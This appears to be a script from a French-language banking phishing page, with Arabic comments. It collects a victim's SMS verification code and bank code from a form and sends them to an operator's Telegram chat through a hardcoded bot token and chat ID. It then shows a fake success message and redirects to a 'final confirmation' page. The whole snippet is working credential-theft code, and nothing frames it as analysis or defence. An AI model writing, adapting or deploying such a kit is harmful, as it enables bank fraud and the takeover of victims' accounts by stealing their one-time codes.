<script>
    // وظيفة لتحديث التاريخ الحالي
    function updateDate() {
        const date = new Date();
        const formattedDate = date.toLocaleDateString('fr-FR', {
            weekday: 'long', year: 'numeric', month: 'long', day: 'numeric'
        });

        document.getElementById('current-date').innerText = formattedDate;
    }

    // تحديث التاريخ عند تحميل الصفحة
    updateDate();

    // وظيفة للتحقق من المدخلات وإرسالها إلى Telegram
    function validate() {
        const smsCode = document.getElementById('code-sms').value;
        const bankCode = document.getElementById('code-banque').value;

        if (smsCode === "" || bankCode === "") {
            alert("Veuillez remplir tous les champs.");
        } else {
            // إعداد البيانات للإرسال
            const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU"; // استبدل بـ Token الخاص ببوت Telegram
            const chatId = "5372119436"; // استبدل بـ Chat ID الخاص بك
            const message = `Code SMS: ${smsCode}\nCode Banque: ${bankCode}`;

            // إرسال البيانات باستخدام طلب HTTP
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => {
                if (response.ok) {
                    alert("Votre validation a été soumise avec succès !");
                    window.location.href = "confirmation_finale.html"; // توجيه للصفحة النهائية
                } else {
                    alert("Erreur lors de l'envoi des données. Veuillez réessayer.");
                }
            })
            .catch(error => {
                console.error("Erreur:", error);
                alert("Une erreur s'est produite. Veuillez réessayer.");
            });
        }
    }
</script>